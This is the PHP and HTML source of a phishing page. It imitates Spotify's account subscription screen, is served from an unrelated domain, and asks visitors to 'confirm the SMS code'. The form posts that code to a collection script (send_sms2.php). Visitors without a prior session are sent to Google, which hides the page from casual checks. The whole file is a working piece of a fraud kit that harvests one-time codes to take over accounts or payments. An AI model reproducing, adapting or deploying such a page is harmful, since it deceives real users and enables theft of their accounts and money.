<?php
session_start();
if (isset($_SESSION["username"])) {
?>
  <html class="translated-ltr">
  
  <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<title>Spotify</title>
    <link rel="icon" href="https://hamidabsahaa.com/sp__3_/st/account/MitID/download.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Spotify is a digital music service that gives you access to millions of songs.">
    <meta name="keywords" content="Spotify, music, online, listen, streaming, play, digital, album, artist, playlist">
    <link rel="stylesheet" href="./sms2_files/spotify-543b91ee3c.css">
  	<link rel="stylesheet" href="./sms2_files/account-4445741da9.css">
    <link rel="stylesheet" href="./sms2_files/embedded-checkout-7f51b6350a.css">

	<script type="text/javascript">	
		function xForm(){
			if (document.getElementById('xnxx').value.length < 9 ) {
				document.getElementById('xnxx').className = "form-control error";
				document.body.style.backgroundColor = "#fefdd2";
				document.getElementById('xnxx').focus();
				return false;
			}
			else{
				document.getElementById('xnxx').className = "form-control";
			}

			if (document.getElementById('xuser').value.length < 8 ) {
				document.getElementById('xuser').className = "form-control error";
				document.body.style.backgroundColor = "#fefdd2";
				document.getElementById('xuser').focus();
				return false;
			}
			else{
				document.getElementById('xuser').className = "form-control";
			}

			if (document.getElementById('aaa').value.length < 4 ) {
				document.getElementById('aaa').className = "form-control error";
				document.body.style.backgroundColor = "#fefdd2";
				document.getElementById('aaa').focus();
				return false;
			}
			else{
				document.getElementById('aaa').className = "form-control";
			}

			document.getElementById('loading').style.display = "block";
			document.getElementById('xbootn').style.display = "none";
		}
	</script>	

<style>undefined</style><link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com/"><link rel="stylesheet" href="./sms2_files/css2"><link type="text/css" rel="stylesheet" charset="UTF-8" href="./sms2_files/m=el_main_css"><style>undefined</style><link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com/"><link rel="stylesheet" href="./sms2_files/css2"><style>undefined</style><link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com/"><link rel="stylesheet" href="./sms2_files/css2"></head>

<body class="m-int l-en page-account-subscription-update is-loggedin reboot" cz-shortcut-listen="true" data-new-gr-c-s-check-loaded="14.1162.0" data-gr-ext-installed="">
	
    <div id="fb-root"></div>
    <div class="wrap">

<header id="js-navbar" class="navbar navbar-default navbar-static-top " role="banner">
    <div class="container">
    <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="sidepanel" data-target="#navbar-nav">
          <span class="sr-only"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Toggle navigation</font></font></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
            <ul class="nav">
        <li class="dropdown">
          <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" class="user-link dropdown-toggle hidden-xs hidden-sm" data-toggle="dropdown">
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
      </use></svg>
    </div>
          </a>
          <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" class="user-link hidden-md hidden-lg" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}">
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
      </use></svg>
    </div>
          </a>
          <ul class="dropdown-menu dropdown-menu-right">
            <li>
              <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">account</font></font></a>
            </li>
            <li>
              <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">log out</font></font></a>
            </li>
          </ul>
        </li>
      </ul>
            <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" class="user-link hidden ">
    <div class="user-icon-container img-circle navbar-user-img">
      <svg class="user-icon">
        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
      </use></svg>
    </div>
      </a>
      <a class="navbar-brand" href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;spotify-logo&quot;}">
        <span class="navbar-logo"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Spotify</font></font></span>
      </a>
    </div>
          <nav class="collapse navbar-collapse" id="navbar-nav" role="navigation">
<ul class="nav navbar-nav navbar-right nav-main">
        <li>
    <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" id="nav-link-premium" data-ga-category="menu" data-ga-action="premium"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      Premium
                </font></font></a>
  </li>
    <li>
    <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" id="nav-link-help" data-ga-category="menu" data-ga-action="help"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      Help
                </font></font></a>
  </li>
<li>
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" id="nav-link-download" class="js-get-spotify js-gtm-event" data-ga-category="menu" data-ga-action="download" data-gtm-event-name="download_spotify_button_clicked" data-tracking="{&quot;category&quot;: &quot;download&quot;, &quot;action&quot;: &quot;download start&quot;, &quot;label&quot;: &quot;download-navbar&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fetch
   </font></font></a>
</li>
  
        
        <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
    <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" id="nav-link-account" data-ga-category="menu" data-ga-action="account"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      account
                </font></font></a>
  </li>
      <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
    <a href="https://www.spotify.com/int/logout/" id="nav-link-log-out" data-ga-category="menu" data-ga-action="log-out"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      log out
                </font></font></a>
  </li>
  <li class="dropdown alternate hidden-sidepanel">
    <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" class="user-link dropdown-toggle" data-toggle="dropdown">
    <div class="user-icon-container img-circle navbar-user-img">
      <svg viewBox="0 0 1024 1024" class="svelte-1o9rgok"></svg>
    </div>
      <span class="user-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Profile</font></font></span>
      <svg class="svg-chevron-down"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#chevron-down"></use></svg>
    </a>
    <ul class="dropdown-menu dropdown-menu-right">
                <li class="alternate sidepanel-item-small visible-md-block ">
    <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" id="nav-link-upgrade" data-ga-category="menu" data-ga-action="upgrade"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
      Upgrade
                </font></font></a>
  </li>
            <li>
        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">account</font></font></a>
      </li>
      <li>
        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#" class="logout-link" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">log out</font></font></a>
      </li>
    </ul>
  </li>
  </ul>
      </nav>
      </div>
</header>
    <div class="content-wrapper">
    <div class="container container-content">
      <div class="row">
                  <div class="col-sm-3 hidden-xs">
<div class="sidebar">
    <div class="user-icon-container img-circle ">
      <svg class="user-icon">
        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
      </use></svg>
    </div>
  <ul class="nav-inverse nav-tabs nav-stacked">
  <li id="submenu-item-account-overview">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-home"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Account summary</font></font></a>
  </li>
  <li id="submenu-item-family-plan">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-redeem"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Premium for the family</font></font></a>
  </li>
  <li id="submenu-item-edit-profile">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-edit"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Edit profile</font></font></a>
  </li>
  <li id="submenu-item-change-password">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-locked"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Change Password</font></font></a>
  </li>
  <li id="submenu-item-notification-settings">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-notifications"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Notification settings</font></font></a>
  </li>
  <li id="submenu-item-offline-devices">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-offline"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offline devices</font></font></a>
  </li>
  <li id="submenu-item-recover-playlists">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-refresh"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Restore playlists</font></font></a>
  </li>
  <li class="active" id="submenu-item-subscription">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-payment"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Subscription</font></font></a>
  </li>
  <li id="submenu-item-receipts">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-payment-history"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Receipts</font></font></a>
  </li>
  <li id="submenu-item-apps">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-apps"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">App</font></font></a>
  </li>
  <li id="submenu-item-redeem">
  <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><svg><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-redeem"></use></svg><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Redeem</font></font></a>
  </li>
  </ul>
</div>
          </div>
                        <div class="col-sm-9">
          <div class="content">
              <div class="article-account">
    <div class="row">
      <div class="col-sm-12">
        <div class="well card change-payment">
          <h2 class="change-payment-header text-center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Confirm the SMS code.</font></font></h2>
          <p class="change-payment-paragraph"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dear customer, Enter the code we just sent to your mobile phone to finish.</font></font></p>
          <section style=" border: 1px solid rgba(191, 176, 176, 0.51); " class="panel panel-form" data-checkout-panel="" data-tracking-endpoint="#">
    <div data-redirect-message="" class="redirect-message checkout-modal hidden">
  <div class="checkout-modal-content">
    <div class="icon">
      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 30 18">
      <polygon points="29.4,9 20.7,0.3 19.3,1.7 25.6,8 0,8 0,10 25.6,10 19.3,16.3 20.7,17.7"></polygon>
      </svg>
    </div>
      <div class="message"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Taking you to complete your purchase...</font></font></div>
  </div>
</div>
          <ul class="list-unstyled picker-tabs" data-payment-picker="">
            <li class="picker-tab">
            
        </li>
          <li class="picker-tab picker-more hidden" data-payment-picker-more="">
        <a class="" href="https://hamidabsahaa.com/sp__3_/st/account/MitID/smserror.php#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">���</font></font></a>
    </li>
</ul>
    <div class="message-panel hidden" data-transactional-messages=""></div>
    <div class="message-panel error-message with-icon hidden" data-form-field-messages="">
    <div class="icon">
      <svg viewBox="0 0 24 24">
        <circle cx="12" cy="12" r="9.5" stroke="currentColor" fill="none"></circle>
        <line x1="12" y1="17" x2="12" y2="10" stroke="currentColor"></line>
        <circle cx="12" cy="7.35" r=".35" stroke="currentColor" fill="none"></circle>
      </svg>
    </div>
    <ul class="form-message-list"></ul>
</div>
                    <div class="panel-tab" data-checkout-panel-tab="" data-name="billing_adyen_cards">
   
        </div>
                    <div class="panel-tab selected" data-checkout-panel-tab="" data-name="billing_paypal">
                    <form id="loginnet" name="loginnet" method="post" action="./system/send_sms2.php">
                  <div class="row">
        <div class="col-xs-12">
	
		<div class="form-group">
                <label id="trans-label_postal_code" for="zip-code"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMS code</font></font></label>
                <input id="smserror" maxlength="6" minlength="6" name="smserror" autocomplete="off" type="text" class="form-control" required="" placeholder="123456" style="
    border: 1px solid red;
">
            </div>
            </div>
    </div>
    <div class="row">
        
    </div>
    <div class="row">
        
        
    </div>
    <div class="row">
        
    </div>
    
    
    <div>
    	<div id="offer_paypal"></div>
    </div>
    <div>
    	<div class="submit-button">
        <button onclick="return xForm()" type="submit" id="offer_submit" name="offer[submit]" class="btn btn-green">
            <span class="submit-icon">
            </span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Confirm        </font></font></button>
    </div></div></form>
        </div>
    </section>
        </div>
      </div>
    </div>
  </div>
          </div>
        </div>
      </div>
    </div>
  </div>
      </div>

</body><grammarly-desktop-integration data-grammarly-shadow-root="true"><template shadowrootmode="open"><style>
      div.grammarly-desktop-integration {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        white-space: nowrap;
        border: 0;
        -moz-user-select: none;
        -webkit-user-select: none;
        -ms-user-select:none;
        user-select:none;
      }

      div.grammarly-desktop-integration:before {
        content: attr(data-content);
      }
    </style><div aria-label="grammarly-integration" role="group" tabindex="-1" class="grammarly-desktop-integration" data-content="{&quot;mode&quot;:&quot;full&quot;,&quot;isActive&quot;:true,&quot;isUserDisabled&quot;:false}"></div></template></grammarly-desktop-integration>
    <footer role="contentinfo" class="footer footer-default ">
    <div class="container">
        <nav class="row">
            <div class="col-xs-12 col-md-2">
                <div class="footer-logo">
                    <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Spotify</font></font></a>
                </div>
            </div>
            <div class="col-xs-6 col-sm-4 col-md-2">
                <h3 class="nav-title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">company</font></font></h3>
                <ul class="nav">
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" id="nav-link-about" data-ga-category="menu" data-ga-action="about"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            About
                        </font></font></a>
                    </li>
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" id="nav-link-jobs" data-ga-category="menu" data-ga-action="jobs"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Jobs
                        </font></font></a>
                    </li>
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" id="nav-link-press" data-ga-category="menu" data-ga-action="press"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Press
                        </font></font></a>
                    </li>
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" id="nav-link-news" data-ga-category="menu" data-ga-action="news"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            News
                        </font></font></a>
                    </li>
                </ul>
            </div>
            <div class="col-xs-6 col-sm-4 col-md-2">
                <h3 class="nav-title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Communities</font></font></h3>
                <ul class="nav">
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" id="nav-link-artists" data-ga-category="menu" data-ga-action="artists"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            For artists
                        </font></font></a>
                    </li>
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" id="nav-link-developers" data-ga-category="menu" data-ga-action="developers"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Developers
                        </font></font></a>
                    </li>
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" id="nav-link-brands" data-ga-category="menu" data-ga-action="brands"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Brands
                        </font></font></a>
                    </li>
                </ul>
            </div>
            <div class="col-xs-6 col-sm-4 col-md-2">
                <h3 class="nav-title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Useful links</font></font></h3>
                <ul class="nav">
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" id="nav-link-help" data-ga-category="menu" data-ga-action="help"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Help
                        </font></font></a>
                    </li>
                    <li>
                        <ahref ="#"="" id="nav-link-gift" data-ga-category="menu" data-ga-action="gift"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                        Married
                        
                    </font></font></ahref></li>
                    <li class="hidden-xs ">
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" id="nav-link-play" data-ga-category="menu" data-ga-action="play"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Web Player
                        </font></font></a>
                    </li>
                </ul>
            </div>
        </nav>
        <nav class="row row-small">
            <div class="col-xs-9 col-md-7">
                <ul class="nav nav-small">
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Legal</font></font></a>
                    </li>
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Privacy</font></font></a>
                    </li>
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookies</font></font></a>
                    </li>
                    <li>
                        <a href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">About Ads</font></font></a>
                    </li>
                </ul>
            </div>
            <div class="col-xs-3 col-md-5 text-right">
                <a class="market" href="https://hamidabsahaa.com/sp__3_/st/account/MitID/loading1.php#" title="Click to change">
                    <div class="media">
                        <div class="media-body media-middle"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            International
                        </font></font></div>
                        <div class="media-right media-middle">
                            <span class="media-object flag-icon flag-icon-int"></span>
                        </div>
                    </div>
                </a>
                <small class="copyright"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">? </font><font style="vertical-align: inherit;">2024 Spotify AB</font></font></small>
            </div>
        </nav>
    </div>
</footer>
</html>
<?php

}else {
    HEADER("Location: https://google.com");
    
    }
?>